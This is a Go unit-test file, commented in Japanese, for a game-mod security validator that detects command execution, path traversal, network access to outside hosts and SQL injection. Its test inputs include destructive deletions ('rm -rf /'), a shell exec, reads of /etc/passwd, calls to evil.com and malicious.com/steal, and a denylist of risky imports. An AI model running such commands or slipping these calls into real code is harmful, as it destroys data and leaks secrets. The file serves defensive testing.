package mod

import (
	"strings"
	"testing"
	"time"
)

// TestSecurityValidator_AnalyzeCode_DangerousCommands テスト: 危険なコマンド実行パターンの検出
func TestSecurityValidator_AnalyzeCode_DangerousCommands(t *testing.T) {
	validator := NewModSecurityValidator()

	code := `
		exec.Command("rm", "-rf", "/")
		os.RemoveAll("/etc")
		syscall.Exec("/bin/sh", []string{}, nil)
	`

	result, err := validator.AnalyzeCode(code)
	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// 3つのセキュリティ違反を検出
	if len(result.Violations) != 3 {
		t.Errorf("Expected 3 violations, got %d", len(result.Violations))
	}

	// 各違反のSeverityはCritical
	for _, v := range result.Violations {
		if v.Severity != SeverityCritical {
			t.Errorf("Expected Critical severity, got %v", v.Severity)
		}
		if v.Type != ViolationTypeCommandInjection {
			t.Errorf("Expected CommandInjection type, got %v", v.Type)
		}
	}

	// 安全でないと判定
	if result.Safe {
		t.Error("Code should be marked as unsafe")
	}
}

// TestSecurityValidator_AnalyzeCode_PathTraversal テスト: パストラバーサル攻撃の検出
func TestSecurityValidator_AnalyzeCode_PathTraversal(t *testing.T) {
	validator := NewModSecurityValidator()

	code := `
		file := "../../../etc/passwd"
		ioutil.ReadFile(file)
		os.Open("../../sensitive.dat")
	`

	result, err := validator.AnalyzeCode(code)
	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// 2つのセキュリティ違反を検出
	if len(result.Violations) != 2 {
		t.Errorf("Expected 2 violations, got %d", len(result.Violations))
	}

	// ViolationTypeはPathTraversal
	for _, v := range result.Violations {
		if v.Type != ViolationTypePathTraversal {
			t.Errorf("Expected PathTraversal type, got %v", v.Type)
		}
		// 修正提案を含む
		if v.Remediation == "" {
			t.Error("Expected remediation suggestion")
		}
	}
}

// TestSecurityValidator_AnalyzeCode_UnauthorizedNetwork テスト: 不正なネットワークアクセスの検出
func TestSecurityValidator_AnalyzeCode_UnauthorizedNetwork(t *testing.T) {
	validator := NewModSecurityValidator()

	code := `
		http.Get("http://malicious.com/steal")
		net.Dial("tcp", "evil.com:666")
		conn, _ := net.Listen("tcp", ":8080")
	`

	result, err := validator.AnalyzeCode(code)
	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// 3つのセキュリティ違反を検出
	if len(result.Violations) != 3 {
		t.Errorf("Expected 3 violations, got %d", len(result.Violations))
	}

	// ViolationTypeはUnauthorizedNetworkAccess
	for _, v := range result.Violations {
		if v.Type != ViolationTypeUnauthorizedNetworkAccess {
			t.Errorf("Expected UnauthorizedNetworkAccess type, got %v", v.Type)
		}
	}
}

// TestSecurityValidator_AnalyzeCode_SafeCode テスト: 安全なコードの検証
func TestSecurityValidator_AnalyzeCode_SafeCode(t *testing.T) {
	validator := NewModSecurityValidator()

	code := `
		entity := api.CreateEntity()
		component := NewHealthComponent(100)
		api.AddComponent(entity, component)
	`

	result, err := validator.AnalyzeCode(code)
	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// セキュリティ違反なし
	if len(result.Violations) != 0 {
		t.Errorf("Expected no violations, got %d", len(result.Violations))
	}

	// Safe = true
	if !result.Safe {
		t.Error("Code should be marked as safe")
	}

	// RiskScore = 0
	if result.RiskScore != 0 {
		t.Errorf("Expected RiskScore 0, got %d", result.RiskScore)
	}
}

// TestSecurityValidator_ValidateImports テスト: 危険なインポートの検出
func TestSecurityValidator_ValidateImports(t *testing.T) {
	validator := NewModSecurityValidator()

	imports := []string{
		"os/exec",
		"syscall",
		"unsafe",
		"plugin",
		"net/http",
	}

	err := validator.ValidateImports(imports)

	// エラーが返される（危険なインポート）
	if err == nil {
		t.Error("Expected error for dangerous imports")
	}

	// エラーメッセージに各インポートが含まれる
	for _, imp := range imports {
		if !strings.Contains(err.Error(), imp) {
			t.Errorf("Error should mention dangerous import: %s", imp)
		}
	}
}

// TestSecurityValidator_CheckPermission テスト: 基本的な権限チェック
func TestSecurityValidator_CheckPermission(t *testing.T) {
	validator := NewModSecurityValidator()

	// ポリシー設定
	policy := PermissionPolicy{
		Level:            SecurityLevelRestricted,
		AllowedResources: []Resource{ResourceEntity, ResourceComponent},
		DeniedActions:    []Action{ActionDelete, ActionSystemCall},
	}

	err := validator.SetPermissionPolicy("mod1", policy)
	if err != nil {
		t.Fatalf("SetPermissionPolicy failed: %v", err)
	}

	// テストケース
	tests := []struct {
		resource Resource
		action   Action
		expected bool
	}{
		{ResourceEntity, ActionCreate, true},
		{ResourceEntity, ActionDelete, false},
		{ResourceFile, ActionRead, false},
	}

	for _, test := range tests {
		result := validator.CheckPermission("mod1", test.resource, test.action)
		if result != test.expected {
			t.Errorf("CheckPermission(%s, %s) = %v, expected %v",
				test.resource, test.action, result, test.expected)
		}
	}
}

// TestSecurityValidator_RequestPermissionElevation テスト: 権限昇格リクエスト
func TestSecurityValidator_RequestPermissionElevation(t *testing.T) {
	validator := NewModSecurityValidator()

	// 権限昇格リクエスト
	token, err := validator.RequestPermissionElevation("mod1", PermissionFileRead)
	if err != nil {
		t.Fatalf("RequestPermissionElevation failed: %v", err)
	}

	// トークンが有効
	if token == nil {
		t.Fatal("Expected valid token")
	}

	// 有効期限が設定されている
	if token.ExpiresAt.Before(time.Now()) {
		t.Error("Token already expired")
	}

	// MOD IDが正しい
	if token.ModID != "mod1" {
		t.Errorf("Expected ModID 'mod1', got %s", token.ModID)
	}

	// 権限が正しい
	if token.Permission != PermissionFileRead {
		t.Errorf("Expected PermissionFileRead, got %s", token.Permission)
	}
}

// TestSecurityValidator_MonitorResourceUsage テスト: リソース使用量監視
func TestSecurityValidator_MonitorResourceUsage(t *testing.T) {
	validator := NewModSecurityValidator()

	usage := validator.MonitorResourceUsage("mod1")

	// リソース使用状況が返される
	if usage == nil {
		t.Fatal("Expected resource usage data")
	}

	// 基本的なメトリクスが含まれる
	if usage.Memory < 0 {
		t.Error("Memory usage should be non-negative")
	}

	if usage.CPU < 0 || usage.CPU > 100 {
		t.Error("CPU usage should be between 0 and 100")
	}

	if usage.Goroutines < 1 {
		t.Error("Should have at least 1 goroutine")
	}
}

// TestSecurityValidator_DetectAnomalies テスト: 異常動作の検出
func TestSecurityValidator_DetectAnomalies(t *testing.T) {
	validator := NewModSecurityValidator()

	events := []BehaviorEvent{
		{Type: EventEntityCreate, Count: 1000, Duration: time.Second},
		{Type: EventFileAccess, Target: "/etc/passwd"},
		{Type: EventNetworkConnect, Target: "unknown.host"},
	}

	anomalies := validator.DetectAnomalies(events)

	// 3つの異常を検出
	if len(anomalies) != 3 {
		t.Errorf("Expected 3 anomalies, got %d", len(anomalies))
	}

	// 各異常に推奨アクションが含まれる
	for _, anomaly := range anomalies {
		if anomaly.Action == "" {
			t.Error("Expected recommended action for anomaly")
		}
	}
}

// TestSecurityValidator_ValidateRuntimeOperation テスト: サンドボックス違反の検出
func TestSecurityValidator_ValidateRuntimeOperation(t *testing.T) {
	validator := NewModSecurityValidator()

	operation := Operation{
		Type:   OpFileWrite,
		Target: "/../../system/config",
		ModID:  "mod1",
	}

	err := validator.ValidateRuntimeOperation(operation)

	// エラーが返される（サンドボックス違反）
	if err == nil {
		t.Error("Expected sandbox violation error")
	}

	// エラーメッセージにサンドボックス違反が含まれる
	if !strings.Contains(err.Error(), "sandbox") {
		t.Error("Error should mention sandbox violation")
	}
}

// TestSecurityValidator_LogSecurityEvent テスト: セキュリティイベントログ
func TestSecurityValidator_LogSecurityEvent(t *testing.T) {
	validator := NewModSecurityValidator()

	event := ValidatorSecurityEvent{
		Type:      EventViolation,
		ModID:     "mod1",
		Details:   "Attempted path traversal",
		Timestamp: time.Now(),
		Severity:  SeverityHigh,
	}

	err := validator.LogSecurityEvent(event)

	// エラーなくログが記録される
	if err != nil {
		t.Errorf("LogSecurityEvent failed: %v", err)
	}
}

// TestSecurityValidator_GenerateSecurityReport テスト: セキュリティレポート生成
func TestSecurityValidator_GenerateSecurityReport(t *testing.T) {
	validator := NewModSecurityValidator()

	// いくつかのイベントをログ
	events := []ValidatorSecurityEvent{
		{Type: EventViolation, ModID: "mod1", Severity: SeverityHigh},
		{Type: EventPermissionDenied, ModID: "mod1", Severity: SeverityMedium},
	}

	for _, event := range events {
		validator.LogSecurityEvent(event)
	}

	// レポート生成
	report := validator.GenerateSecurityReport("mod1", 24*time.Hour)

	// レポートが生成される
	if report == nil {
		t.Fatal("Expected security report")
	}

	// MOD IDが正しい
	if report.ModID != "mod1" {
		t.Errorf("Expected ModID 'mod1', got %s", report.ModID)
	}

	// 違反件数が正しい
	if report.ViolationCount == 0 {
		t.Error("Expected violation count > 0")
	}
}

// TestSecurityValidator_GetAuditTrail テスト: 監査証跡の検索
func TestSecurityValidator_GetAuditTrail(t *testing.T) {
	validator := NewModSecurityValidator()

	// いくつかのイベントをログ
	event := ValidatorSecurityEvent{
		Type:      EventViolation,
		ModID:     "mod1",
		Timestamp: time.Now(),
		Severity:  SeverityHigh,
	}
	validator.LogSecurityEvent(event)

	// フィルタリング
	filter := AuditFilter{
		ModID:      "mod1",
		StartTime:  time.Now().Add(-1 * time.Hour),
		EventTypes: []EventType{EventViolation},
	}

	entries := validator.GetAuditTrail(filter)

	// エントリが返される
	if len(entries) == 0 {
		t.Error("Expected audit entries")
	}

	// フィルタ条件に一致
	for _, entry := range entries {
		if entry.ModID != "mod1" {
			t.Errorf("Expected ModID 'mod1', got %s", entry.ModID)
		}
	}
}

// TestSecurityValidator_Performance_AnalyzeSpeed テスト: 静的解析速度
func TestSecurityValidator_Performance_AnalyzeSpeed(t *testing.T) {
	validator := NewModSecurityValidator()

	// 1000行のコード生成
	var code strings.Builder
	for i := 0; i < 1000; i++ {
		code.WriteString("entity := api.CreateEntity()\n")
	}

	start := time.Now()
	_, err := validator.AnalyzeCode(code.String())
	duration := time.Since(start)

	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// 100ms以内で完了
	if duration > 100*time.Millisecond {
		t.Errorf("Analysis took %v, expected < 100ms", duration)
	}
}

// TestSecurityValidator_SQLInjection テスト: SQLインジェクション検出
func TestSecurityValidator_SQLInjection(t *testing.T) {
	validator := NewModSecurityValidator()

	code := `
		query := "SELECT * FROM users WHERE id = " + userInput
		db.Query(query)
	`

	result, err := validator.AnalyzeCode(code)
	if err != nil {
		t.Fatalf("AnalyzeCode failed: %v", err)
	}

	// SQLインジェクションリスク検出
	found := false
	for _, v := range result.Violations {
		if v.Type == ViolationTypeSQLInjection {
			found = true
			// パラメータ化クエリの提案
			if !strings.Contains(v.Remediation, "parameter") {
				t.Error("Expected suggestion for parameterized queries")
			}
		}
	}

	if !found {
		t.Error("Expected SQL injection violation")
	}
}

// NewModSecurityValidator テスト用のファクトリー関数（未実装）
func NewModSecurityValidator() ModSecurityValidator {
	// TDD Red段階: まだ実装なし
	return nil
}
